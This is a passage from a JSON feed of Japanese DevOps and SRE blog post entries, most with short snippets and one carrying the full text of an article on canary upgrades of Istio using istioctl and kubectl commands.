runの要らなくなったリビジョンを消す","contentSnippet":"小ネタです。運用をしていて、たくさんリリースしているとリビジョンが増えていることとかもあるかなと思いますが、コンソール上から消すのも面倒なので、コマンドで消しましょう。というか、解説することもないので、結論と詰まった部分だけ残しておきます。 結論 ACTIVEじゃないものをすべて消す#!/bin/bashSERVICE_NAME=$1revisions=$(    gcloud run revisions list --service=$SERVICE_NAME \\\\    --filter=\\"status.conditions.type:Active AND s...","link":"https://zenn.dev/satohjohn/articles/2a769b8280427d","isoDate":"2023-03-21T02:35:43.000Z","dateMiliSeconds":1679366143000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Datadog Agent からの Metrics を Victoria Metrics で受ける","contentSnippet":"Victoria Metrics は v1.67.0 で Datadog Agent からのメトリクスを受け取れるようになっているので今回はこれを試してみる。 Victoria Metrics のドキュメント How to send data from DataDog agent Single node Instance をセットアップ # Victoria Metrics はクラスタリング","link":"https://blog.1q77.com/2023/03/send-datadog-metrics-to-victoriametrics/","isoDate":"2023-03-19T12:38:04.000Z","dateMiliSeconds":1679229484000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Azure Bicep で Storage Account の SSE を設定する","contentSnippet":"Azure Bicep で Storage Account の SSE (サーバー側暗号化) を設定してみようとしたところ、思ったより難しかったのと、やりたいことそのままのサンプルコードがなかったため、調査した内容を公開してみます。 この記事で書いてあることAzure Bicep を使用して Storage Account の SSE を設定する方法 サンプルコード早く使い方とコードを見たい、という方向けにまずはサンプル コードについて記載します。この記事で説明するサンプル コードの全体は下記を参照ください。https://github.com/kiyo-s/crea...","link":"https://zenn.dev/kyohei_saito/articles/fb102fd2af31e2","isoDate":"2023-03-19T04:44:58.000Z","dateMiliSeconds":1679201098000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"k8s.gcr.io の凍結対応から学んだことメモ","contentSnippet":"今まで Kubernetes プロジェクトのコンテナ イメージをホストしていたイメージ レジストリ k8s.gcr.io が凍結されることが発表されました。この記事では、k8s.gcr.io から registry.k8s.io に移行する過程で学んだことについて、備忘としてメモします。 この記事で書いてあることk8s.gcr.io から registry.k8s.io に移行した流れhelm で、dependencies によって外部の chart を install している場合に、外部の chart の values を設定する方法skopeo によりローカルで ...","link":"https://zenn.dev/kyohei_saito/articles/d0080d94dae0b7","isoDate":"2023-03-18T19:08:14.000Z","dateMiliSeconds":1679166494000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"[Terraform] aws_networkfirewall_firewall リソースから VPC エンドポイント ID を取り出す","contentSnippet":"はじめにTerraform を使って AWS Network Firewall のファイアウォールを作るとき，生成された VPC エンドポイントの ID をサブネットのルートテーブルのルートに追加するのは自然な流れですが，VPC エンドポイント ID を取り出すのが大変だったので，やり方を記録しておきます。例えば以下のように aws_networkfirewall_firewall リソースを定義したとします。（特に説明のない変数やリソースは，なんとなくの理解で構いません。）resource \\"aws_networkfirewall_firewall\\" \\"firewall\\" ...","link":"https://zenn.dev/toshikish/articles/fc08c2021811f9","isoDate":"2023-03-16T07:58:23.000Z","dateMiliSeconds":1678953503000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Kubernetes の運用効率化を ChatGPT で実現する 障害対応編","contentSnippet":"1. はじめに はじめまして、Sreake事業部インターン生の井上です。私はSreake事業部にてSRE技術の調査と研究を行う目的で2023年3月6日から長期インターン生として参加しています。 本記事では、Kuberne […]The post Kubernetes の運用効率化を ChatGPT で実現する 障害対応編 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/kubernetes-operation-with-chatgpt/","isoDate":"2023-03-16T01:32:14.000Z","dateMiliSeconds":1678930334000,"authorName":"Sreake","authorId":"Sreake"},{"title":"ビットコイン・ライトニングネットワーク概論","contentSnippet":"https://event.ospn.jp/osc2023-online-spring/session/809175\\rビットコインは送金トランザクションの処理量に限界があり、ブロックチェーンの外での送金を行うオフチェーン技術により手数料の軽減と、送金の高速化を実現できます。\\r\\rオフチェーンの中でもビットコインと同様、中央管理者のいないライトニングネットワークの開発が進んでいます。\\r\\rライトニングネットワーク技術の骨格をまとめました。","link":"https://speakerdeck.com/shukob/bitutokoinraitoningunetutowakugai-lun-749a7a47-5e72-4585-bcfd-40e8643a7143","isoDate":"2023-03-11T05:00:00.000Z","dateMiliSeconds":1678510800000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"振り返り (2020 - 2022)","contentSnippet":"コロプラに 2020/3/1 に入社して、2023/2/28 付けで退職したので、丸々 3 年間勤務したことになります。本当の意味での大規模 Kubernetes 環境で貴重な経験をさせて貰い感謝しかないです。記憶が新しい内に、この 3 年間でやってきたことを公開できる範囲で整理しました。 GitOps 風なマニフェスト管理への移行インフラチームで管理している監視ツールやアドオンなコンポーネントを Helm でインストールしていました。マルチクラスタな環境で手動インストールはスケールしないので、Helmfile で生成した各クラスタのマニフェストを Argo CD で同期する方式に...","link":"https://zenn.dev/toversus/articles/8557a7fb2bc15c","isoDate":"2023-03-05T14:17:49.000Z","dateMiliSeconds":1678025869000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"Devbox を使った開発環境","contentSnippet":"ローカル環境を汚さずDockerコンテナのオーバーヘッドもなく、開発環境を自在に構築できる「Devbox 0.2.0」登場 － Publickey この記事を最初に見たときは「えーそん","link":"https://blog.1q77.com/2023/03/devbox/","isoDate":"2023-03-04T15:05:12.000Z","dateMiliSeconds":1677942312000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"2023年もSRE再考と叫びなさい‼️","contentSnippet":"2023年もSRE再考と叫びなさい‼️ SREの跡を求めず SREの求めたるところを求めよ というタイトルで登壇してきました\\r\\r2023年3月3日 エンジニア文化祭 2023\\rhttps://forkwell.connpass.com/event/272596/\\r\\r『2023年もSRE再考と叫びなさい!!』というタイトルで登壇しました - じゃあ、おうちで学べる\\rhttps://syu-m-5151.hatenablog.com/entry/2023/03/03/105049","link":"https://speakerdeck.com/nwiizo/2023nian-mosrezai-kao-tojiao-binasai","isoDate":"2023-03-03T05:00:00.000Z","dateMiliSeconds":1677819600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Snowflakeでのコスト管理","contentSnippet":"Snowflakeを最近触ってみることがあったので、コスト周りについて個人的に調べたログ参考ドキュメント↓Snowflakeでのコスト管理 | Snowflake Documentation お品書きSnowflakeのコストについてSnowflakeのコスト調査Snowflakeのコスト制御 SnowflakeのコストについてSnowflakeでのコストは次の3つの領域に分類される。コンピューティング: ユーザー管理(仮想ウェアハウス)、Snowflake管理(Snowpipeなどのサーバーレス機能)、およびクラウドサービスストレージ: データステージング...","link":"https://zenn.dev/nedoko_dok0dko/articles/ffe6450c4cd851","isoDate":"2023-02-28T10:45:26.000Z","dateMiliSeconds":1677581126000,"authorName":"seno","authorId":"seno"},{"title":"【Istio⛵️】Istioを安全にアップグレードするカナリア方式とその仕組み","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Istioのアップグレード手法の種類について安全なカナリア方式の仕組みについてこの記事から得られる知識01. はじめに02. なぜ安全なアップグレードが必要なのか起こりうる問題採用するべきアップグレード手法03. アップグレード手法を説明する前にカナリアリリースとはカナリアリリースの手順(1) 新環境のリリース(2) 新環境への重み付けルーティング(3) 実地的テストの実施(4) 重み付けの段階的変更『カナリアリリース』の呼称の由来04. アップグレード手法の概要(1) アップグレード前の検証(2) 新Istiodのインストール(3) Webhookの宛先のServiceの変更(4) Istio IngressGatewayをインプレースアップグレード(5) 一部のNamespaceのistio-proxyコンテナをアップグレード(6) ユーザの手を借りたテスト(7) istio-proxyコンテナの段階的アップグレード(8) 旧Istiodのアンインストール05. アップグレード手法の詳細istioctl コマンドを使用したアップグレード前提NamespaceIstiodIstio IngressGatewayマイクロサービス(1) アップグレード前の検証ここで実施することistioctl x precheckコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ 宛先のServiceを決めるMutatingWebhookConfiguration(2) 新Istiodのインストールここで実施することistioctl versionコマンドistioctl installコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ Webhookの宛先のServiceを決めるMutatingWebhookConfiguration(3) Webhookの宛先のServiceの変更ここで実施することistioctl tag setコマンド(4) Istio IngressGatewayをインプレースアップグレードここで実施することkubectl rollout restartコマンド(5) 一部のNamespaceのistio-proxyコンテナをアップグレードここで実施することkubectl rollout restartコマンド(6) ユーザの手を借りたテストここで実施することもし問題が起こった場合(7) istio-proxyコンテナの段階的アップグレードここで実施することkubectl rollout restartコマンド(8) 旧Istiodのアンインストールここで実施することistioctl uninstallコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ 宛先のServiceを決めるMutatingWebhookConfiguration06. おわりに記事関連のおすすめ書籍01. はじめに隠しません。有吉弘行のサンデーナイトドリーマー が生きがいです。さて、最近の業務でIstio⛵️をひたすらアップグレードしています。今回は、採用したアップグレード手法の紹介も兼ねて、Istioの安全なアップグレード手法の仕組みを記事で解説しました。Istioのアップグレード手法には変遷があり、解説するのは執筆時点 (2023/02/26) で最新の 1.14 系のアップグレード手法です。それでは、もりもり布教していきます\uD83D\uDE1702. なぜ安全なアップグレードが必要なのか起こりうる問題そもそも、なぜIstioで安全なアップグレードを採用する必要があるのでしょうか。Istioで問題が起こると、Pod内のistio-proxyコンテナが正しく稼働せず、システムに大きな影響を与える可能性があります。例えば、istio-proxyコンテナのPodへのインジェクションがずっと完了せず、アプリコンテナへの通信が全て遮断されるといったことが起こることがあります。採用するべきアップグレード手法執筆時点 (2023/02/26) では、Istiodコントロールプレーン (以降、Istiodとします) のアップグレード手法には、『インプレース方式』と『カナリア方式』があります。また合わせてアップグレードが必要なIstio IngressGatewayには、その手法に『インプレース方式』があります。今回の安全なアップグレード手法として、Istiodでは『カナリアアップグレード』、Istio IngressGatewayでは『インプレースアップグレード』を採用します。Istio / Canary UpgradesIstio / Installing Gateways03. アップグレード手法を説明する前にカナリアリリースとはIstiodのカナリアアップグレードが理解しやすくなるように、カナリアリリースから説明したいと思います。カナリアリリースは、実際のユーザーにテストしてもらいながらリリースする手法です。もしカナリアリリースをご存知の方は、 04. アップグレード手法の概要 まで飛ばしてください\uD83D\uDE47\uD83C\uDFFB‍カナリアリリースの手順カナリアリリースは、一部のユーザーを犠牲にすることになる一方で、アプリを実地的にテストできる点で優れています。手順を交えながら説明します。Canary Release(1) 新環境のリリース旧環境のアプリを残したまま、新環境をリリースします。この段階では、全てのユーザー (100%) を旧環境にルーティングします。(2) 新環境への重み付けルーティングロードバランサーで重み付けを変更し、一部のユーザー (ここでは10%) を新環境にルーティングします。(3) 実地的テストの実施ユーザーの手を借りて新環境を実地的にテストします (例：該当のエラーメトリクスが基準値を満たすか) 。(4) 重み付けの段階的変更新環境に問題が起こらなければ、重み付けを段階的に変更し、最終的には全てのユーザー (100%) を新環境にルーティングします。『カナリアリリース』の呼称の由来カナリアリリースについては、その呼称の由来を知ると、より理解が深まります。カナリアリリースは、20世紀頃の炭坑労働者の危機察知方法に由来します。炭鉱内には有毒な一酸化炭素が発生する場所がありますが、これは無色無臭なため、気づくことに遅れる可能性があります。そこで当時の炭鉱労働者は、一酸化炭素に敏感な『カナリア』を炭鉱内に持ち込み、カナリアの様子から一酸化炭素の存在を察知するようにしていたそうです。つまり、先ほどの『犠牲になる一部のユーザー』が、ここでいうカナリアというわけです\uD83D\uDE28画像引用元：George McCaa, U.S. Bureau of MinesAbout canary deployment in simple words04. アップグレード手法の概要カナリアリリースを理解したところで、Istioの安全なアップグレード手法の概要を説明します。おおよそ以下の手順からなります。なお各番号は、05. アップグレード手法の詳細 の (1) 〜 (8) に対応しています。(1) アップグレード前の検証旧Istiodが稼働しています。ここで、アップグレードが可能かどうかを検証しておきます。(2) 新Istiodのインストール新Istiod (discoveryコンテナ) をインストールします。(3) Webhookの宛先のServiceの変更新Istiodのistio-proxyコンテナをインジェクションできるように、Webhookの宛先のServiceを変更します。この手順は重要で、後の  (3) Webhookの宛先のServiceの変更 で詳細を説明しています。(4) Istio IngressGatewayをインプレースアップグレードIstio IngressGatewayをインプレースアップグレードします。(5) 一部のNamespaceのistio-proxyコンテナをアップグレード一部のNamespaceで、istio-proxyコンテナをカナリアアップグレードします。▶︎ 『カナリアアップグレード』の呼称についてカナリアリリースのような重み付けがなく、カナリアアップグレードの『カナリア』という呼称に違和感を持つ方がいるかもしれません。これについては、全てのNamespaceのistio-proxyコンテナを一斉にアップグレードするのではなく、段階的にアップグレードしていく様子を『カナリア』と呼称している、と個人的に推測しています。もし『カナリアアップグレード』の由来をご存じの方は、ぜひ教えていただけると\uD83D\uDE47\uD83C\uDFFB‍(6) ユーザの手を借りたテストユーザーの手を借りて、実地的にテストします (例：該当のエラーメトリクスが基準値以下を満たすか) 。(7) istio-proxyコンテナの段階的アップグレード新Istiodのistio-proxyコンテナに問題が起こらなければ、他のNamespaceでもistio-proxyコンテナを段階的にカナリアアップグレードしていきます。一方でもし問題が起これば、Namespaceのistio-proxyコンテナとIstio IngressGatewayをダウングレードします。(8) 旧Istiodのアンインストール最後に、旧Istiodをアンインストールします。Istio / Canary Upgrades05. アップグレード手法の詳細istioctl コマンドを使用したアップグレードここからは、04. アップグレード手法の概要 を深ぼっていきます。今回は、ドキュメントで一番優先して記載されている istioctl コマンドを使用した手順 を説明します。なお各番号は、04. アップグレード手法の概要 の (1) 〜 (8) に対応しています。▶︎ アップグレードに使用するツールについてistioctlコマンド以外のツール (例：helmコマンド、helmfileコマンド、ArgoCD) を使用してもアップグレードできます。細かな手順が異なるだけで、アップグレード手法の概要は同じです\uD83D\uDE46\uD83C\uDFFB‍前提Namespaceまず最初に、前提となる状況を設定しておきます。各Namespaceのistio.io/revラベルにdefaultが設定されているとします。$ kubectl get namespace -L istio.io/revNAME              STATUS   AGE   REVfoo               Active   34d   defaultbar               Active   34d   defaultbaz               Active   34d   defaultistio-ingress     Active   34d   default...▶︎ istio.io/revラベル値のエイリアスについてistio.io/revラベル値は、どんなエイリアスでもよいです。よくあるエイリアスとしてdefaultやstableを使用します\uD83D\uDC4Dさらに、マニフェストに書き起こすと以下のようになっています。apiVersion: v1kind: Namespacemetadata:  name: foo  labels:    istio.io/rev: defaultこのistio.io/revラベルがあることにより、そのNamespaceのPodにistio-proxyコンテナを自動的にインジェクションします。▶︎ istio-proxyコンテナのインジェクションの仕組みについてについてistio-proxyコンテナのインジェクションの仕組みについては、今回言及しておりません。以下の記事で解説していますため、もし気になる方はよろしくどうぞ\uD83D\uDE47\uD83C\uDFFB‍Istiodすでに1-14-6のIstiodが動いており、1-15-4にカナリアアップグレードします。IstiodはDeployment配下のPodであり、このPodはIstiodの実体であるdiscoveryコンテナを持ちます。$ kubectl get deployment -n istio-system -l app=istiodNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6          1/1     1            1           47s # 1-14-6Istio IngressGatewayIstio IngressGatewayはIstiodとは異なるNamespaceで動いており、インプレースアップグレードします。Istio IngressGatewayはistio-proxyコンテナを持ちます。$ kubectl get deployment -n istio-ingressNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistio-ingressgateway   1/1     1            1           47s▶︎ IstiodとIstio IngressGatewayを動かすNamespaceについてラクティスでは、IstiodとIstio IngressGatewayは異なるNamespaceで動かすことが推奨されています。Istio / Installing Gatewaysマイクロサービス各Namespaceでマイクロサービスが動いています。マイクロサービスのPodはistio-proxyコンテナを持ちます。$ kubectl get deployment -n fooNAME   READY   UP-TO-DATE   AVAILABLE   AGEfoo    2/2     1            1           47s...$ kubectl get deployment -n barNAME   READY   UP-TO-DATE   AVAILABLE   AGEbar    2/2     1            1           47s..$ kubectl get deployment -n bazNAME   READY   UP-TO-DATE   AVAILABLE   AGEbaz    2/2     1            1           47s...(1) アップグレード前の検証ここで実施することアップグレード前に、現在のKubernetes Clusterがアップグレード要件を満たしているかを検証します。Before you upgradeistioctl x precheckコマンドistioctl x precheckコマンドを実行し、アップグレード要件を検証します。問題がなければ、istioctlコマンドはNo issue ...の文言を出力します。$ istioctl x precheck✅ No issues found when checking the cluster.Istiois safe to install or upgrade!  To get started, check out https://istio.io/latest/docs/setup/getting-started/▶︎ アップグレード要件が満たない場合についてistioctl x precheckコマンドはエラー文言を出力します。例えば、Istioのistio-proxyコンテナのインジェクションではkube-apiserverと通信する必要があります。そのため、kube-apiserverのバージョンが古すぎるせいでIstioが非対応であると、エラーになります\uD83D\uDE2Dkubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、現在のIstiodのバージョンを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-14-6のDeploymentがあります。$ kubectl get deployment -n istio-system -l app=istiodNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6          1/1     1            1           47s # 1-14-6istio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47▼ Webhookの宛先のService次に、 Serviceを確認すると、1-14-6のServiceがあります。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-14-6   ClusterIP   10.96.93.151     <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   109s # 1-14-6このServiceは、kube-apiserverからIstiodへのWebhookを仲介することにより、istio-proxyコンテナのインジェクションを可能にします。istio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47▼ 宛先のServiceを決めるMutatingWebhookConfiguration最後に、MutatingWebhookConfigurationを確認すると、istio-revision-tag-<エイリアス>とistio-sidecar-injector-<リビジョン番号>のMutatingWebhookConfigurationがあります。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # カナリアアップグレード用istio-sidecar-injector-1-14-6   2          2m16s # インプレースアップグレード用のため今回は言及しないistio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47これらのうち、前者 (istio-revision-tag-<エイリアス>) をカナリアアップグレードのために使用します。このMutatingWebhookConfigurationは、Webhookの宛先のServiceを決めるため、結果的にistio-proxyコンテナのバージョンを決めます。ここで、MutatingWebhookConfigurationのistio.io/revラベルとistio.io/tagラベルの値も確認しておきます。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.metadata.labels\'...istio.io/rev: 1-14-6istio.io/tag: default...istio.io/revラベルはIstiodのバージョン、istio.io/tagラベルはこれのエイリアスを表しています。また、.webhooks[].namespaceSelectorキー配下のistio.io/revキーの検知ルールを確認します。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[]\'...namespaceSelector:  matchExpressions:    - key: istio.io/rev      operator: In      values:        - default...合わせて、.webhooks[].clientConfig.serviceキー配下のServiceを名前を確認します。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[].clientConfig\'...service:  name: istiod-1-14-6...▶︎ MutatingWebhookConfigurationの役割についてistio.io/revラベルにdefaultを設定してあるとします。すると、上記のMutatingWebhookConfigurationがこれを検知します。MutatingWebhookConfigurationにはdefaultに対応するIstioのリビジョンが定義されており、kube-apiserverが特定のIstioのバージョンのServiceにWebhookを送信可能になります\uD83C\uDF89Istio / Safely upgrade the Istio control plane with revisions and tags(2) 新Istiodのインストールここで実施することそれでは、新Istiodをインストールします。Control planeistioctl versionコマンド新しくインストールするIstiodのバージョンは、istioctlコマンドのバージョンで決まります。そこで、istioctl versionコマンドを実行し、これのバージョンを確認します。$ istioctl versionclient version: 1.15.4        # アップグレード先のバージョンcontrol plane version: 1.14.6 # 現在のバージョンdata plane version: 1.14.6istioctl installコマンドカナリアアップグレードの場合、istioctl installコマンドを実行します。ドキュメントではrevisionキーの値がcanaryですが、今回は1-15-4とします。この値は、Istioが使用する様々なKubernetesリソースの接尾辞や、各リソースのistio.io/revラベルの値になります。$ istioctl install --set revision=1-15-4WARNING: Istio is being upgraded from 1.14.6 -> 1.15.4WARNING: Before upgrading, you may wish to use \'istioctl analyze\' to check for IST0002 and IST0135 deprecation warnings.✅ Istio core installed✅ Istiod installed✅ Ingress gateways installed✅ Installation completeThank you for installing Istio 1.15.  Please take a few minutes to tell us about your install/upgrade experience!▶︎ カナリアアップグレードで指定できるバージョン差についてrevisionキーを使用したカナリアアップグレードでは、2つの先のマイナーバージョンまでアップグレードできます。例えば、現在のIstioが1.14.6であるなら、1.16系まで対応しています\uD83D\uDC4DIstio / Canary Upgradeskubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、istioctl installコマンドで何をインストールしたのかを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-15-4というDeploymentが新しく増えています。$ kubectl get deployment -n istio-system -l app=istiodNAME            READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6   1/1     1            1           47s # 1-14-6istiod-1-15-4   1/1     1            1           47s # 1-15-4接尾辞の1-15-4は、revisionキーの値で決まります。この段階では、旧Istiodと新Istioが並行的に稼働しており、kube-apiserverはまだ旧Istiodと通信しています今の状況は以下の通りです\uD83D\uDC47▼ Webhookの宛先のService次に Webhookの宛先のServiceを確認すると、istiod-1-15-4というServiceが新しく増えています。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-14-6   ClusterIP   10.96.93.151     <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   109s # 1-14-6istiod-1-15-4   ClusterIP   10.104.186.250   <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   87s  # 1-15-4この段階では、まだWebhookの宛先はistiod-1-14-6のServiceです。今の状況は以下の通りです\uD83D\uDC47▼ Webhookの宛先のServiceを決めるMutatingWebhookConfiguration最後にMutatingWebhookConfigurationを確認すると、istio-sidecar-injector-1-15-4というMutatingWebhookConfigurationが新しく増えています。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # カナリアアップグレードで使用するistio-sidecar-injector-1-14-6   2          2m16sistio-sidecar-injector-1-15-4   2          2m16sカナリアアップグレードでは、istio-revision-tag-<エイリアス>のMutatingWebhookConfigurationを使用します。今の状況は以下の通りです\uD83D\uDC47▶︎ アンインストールについて(3) Webhookの宛先のServiceの変更ここで実施することこの手順では、エイリアスのistio.io/tagラベルの値はそのままにしておき、一方でistio.io/revラベルの値を変更します。さらに、Webhookの宛先のServiceを変更します。Default tagSafely upgrade the Istio control plane with revisions and tagsistioctl tag setコマンドistioctl tag setコマンドを実行し、istio.io/revラベルの値と宛先のServiceを変更します。$ istioctl tag set default --revision 1-15-4 --overwrite実行後に、もう一度MutatingWebhookConfigurationを確認すると、istio.io/revラベルの値が変わっています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.metadata.labels\'...istio.io/rev: 1-15-4istio.io/tag: default...また、Webhookの宛先のServiceも変わっています。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[].clientConfig\'...service:  name: istiod-1-15-4...これらにより、Webhookの宛先が 1-15-4 のService となります。そのため、 1-15-4 の istio-proxy コンテナをインジェクションできる ようになります。今の状況は以下の通りです\uD83D\uDC47(4) Istio IngressGatewayをインプレースアップグレードここで実施することWebhookの宛先が1-15-4のServiceに変わったところで、Istio IngressGatewayをインプレースアップグレードします。In place upgradekubectl rollout restartコマンドkubectl rollout restartコマンドを実行し、Istio IngressGatewayをインプレースアップグレードします。$ kubectl rollout restart deployment istio-ingressgateway-n istio-ingress再作成したPodのイメージを確認してみると、istio-proxyコンテナを1-15-4にアップグレードできています。$ kubectl get pod bar -n bar -o yaml | yq \'.spec.containers[].image\'docker.io/istio/proxyv2:1.15.4 # istio-proxyコンテナ▶︎ istioctl proxy-statusコマンドについてkubectl getコマンドの代わりに、istioctl proxy-statusコマンドを使用して、アップグレードの完了を確認してもよいです。今の状況は以下の通りです\uD83D\uDC47▶︎ Istio IngressGatewayの通信遮断について(5) 一部のNamespaceのistio-proxyコンテナをアップグレードここで実施すること続けて、一部のNamespaceのistio-proxyコンテナをアップグレードします。Podの再作成により、新Istiodのistio-proxyコンテナがインジェクションされるため。istio-proxyコンテナをアップグレードできます。Data planekubectl rollout restartコマンド前提にあるように、Namespaceには foo bar baz があります。kubectl rollout restartコマンドを実行し、barのistio-proxyコンテナからアップグレードします。$ kubectl rollout restart deployment bar -n bar再作成したPodのイメージを確認してみると、istio-proxyコンテナを1-15-4にアップグレードできています。$ kubectl get pod bar -n bar -o yaml | yq \'.spec.containers[].image\'bar-app:1.0 # マイクロサービスdocker.io/istio/proxyv2:1.15.4 # istio-proxyコンテナ▶︎ istioctl proxy-statusコマンドについてkubectl getコマンドの代わりに、istioctl proxy-statusコマンドを使用して、アップグレードの完了を確認してもよいです。今の状況は以下の通りです\uD83D\uDC47(6) ユーザの手を借りたテストここで実施することIstioを部分的にアップグレードしたところで、アップグレードが完了したNamespaceをテストします。ユーザーの手を借りて実地的にテストします (例：該当のエラーメトリクスが基準値を満たすか) 。今の状況は以下の通りです\uD83D\uDC47もし問題が起こった場合もし問題が起こった場合、1-14-6にダウングレードしていきます。istioctl tag setコマンドを実行し、istio.io/revラベルの値を元に戻します。$ istioctl tag set default --revision 1-14-6 --overwriteその後、kubectl rollout restartコマンドの手順を実行し、istio-proxyコンテナをダウングレードしてきます。(7) istio-proxyコンテナの段階的アップグレードここで実施すること先ほどのNamespaceで問題が起こらなければ、残ったNamespace (foo、baz、...) のistio-proxyコンテナも段階的にアップグレードしていきます。kubectl rollout restartコマンド同様にkubectl rollout restartコマンドを実行し、istio-proxyコンテナからアップグレードします。$ kubectl rollout restart deployment foo -n foo$ kubectl rollout restart deployment baz -n baz...最終的に、全てのNamespacemのistio-proxyコンテナが新しくなります。今の状況は以下の通りです\uD83D\uDC47(8) 旧Istiodのアンインストールここで実施すること最後に、旧Istiodのアンインストールします。Uninstall old control planeistioctl uninstallコマンドistioctl uninstallコマンドを実行し、旧Istiodをアンインストールします。$ istioctl uninstall --revision 1-14-6✅ Uninstall complete今の状況は以下の通りです\uD83D\uDC47kubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、istioctl uninstallコマンドで何をアンインストールしたのかを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-14-6というDeploymentが無くなっています。$ kubectl get deployment -n istio-system -l app=istiodNAME            READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-15-4   1/1     1            1           47s # 1-15-4▼ Webhookの宛先のService次に Webhookの宛先のServiceを確認すると、istiod-1-14-6というServiceが無くなっています。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-15-4   ClusterIP   10.104.186.250   <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   87s  # 1-15-4▼ 宛先のServiceを決めるMutatingWebhookConfiguration最後にMutatingWebhookConfigurationを確認すると、istio-sidecar-injector-1-14-6というMutatingWebhookConfigurationが無くなっています。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # 次のカナリアアップグレードでも使用するistio-sidecar-injector-1-15-4   2          2m16sこれで、新Istiodに完全に入れ替わったため、アップグレードは完了です。今の状況は以下の通りです\uD83D\uDC47▶︎ アンインストールについて06. おわりにIstioを安全にアップグレードするカナリア方式とその仕組みをもりもり布教しました。Istioへの愛が溢れてしまいました。これからIstioを採用予定の方は、Istioを安全にアップグレードするために十分に準備しておくことをお勧めします\uD83D\uDC4D記事関連のおすすめ書籍Istio in Action (English Edition)作者:Posta, Christian E.,Maloku, RinorManningAmazonIstio: Up and Running: Using a Service Mesh to Connect, Secure, Control, and Observe作者:Calcote, Lee,Butcher, ZackO\'Reilly MediaAmazon","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/02/26/202548","isoDate":"2023-02-26T11:25:48.000Z","dateMiliSeconds":1677410748000,"authorName":"Hiroki Hasegawa","authorId":"hiroki-hasegawa"},{"title":"LINE に送ったメッセージを Google Home に読み上げさせる","contentSnippet":"令和の時代、家に固定電話はなく、外出先から家族に直ぐに答えて欲しいことがあってもスマホはマナーモードで手元に置いてなければ気づくことができません。 そんなわけで、","link":"https://blog.1q77.com/2023/02/line-bot-tts/","isoDate":"2023-02-25T12:51:58.000Z","dateMiliSeconds":1677329518000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"自由研究には向かないウェブオペレーション\xa0","contentSnippet":"自由研究には向かないウェブオペレーション\xa0サイト運用管理を取り巻く環境の変化 Cloud Native時代に考えるLinux オペレーション というタイトルで登壇してきました。\\r\\r2023年2月18日\\r【今更聞けない】Linuxのしくみ - Forkwell Library #16\\rhttps://forkwell.connpass.com/event/273179/\\r\\rあとがき\\r『自由研究には向かないウェブオペレーション』というタイトルで登壇しました。\\rhttps://syu-m-5151.hatenablog.com/entry/2023/02/18/201252","link":"https://speakerdeck.com/nwiizo/zi-you-yan-jiu-nihaxiang-kanaiuebuoperesiyon","isoDate":"2023-02-18T05:00:00.000Z","dateMiliSeconds":1676696400000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"運用の効率化を支える AWS Systems Manager Automation の紹介","contentSnippet":"AWS Systems Manager（SSM）では運用に役立つ機能が提供されています。 ただし、提供されている機能が多く、今まで使用した経験があるのは一部の機能に限られていましたので、どのようなことができるのか調べてみ […]The post 運用の効率化を支える AWS Systems Manager Automation の紹介 first appeared on sreake.com | 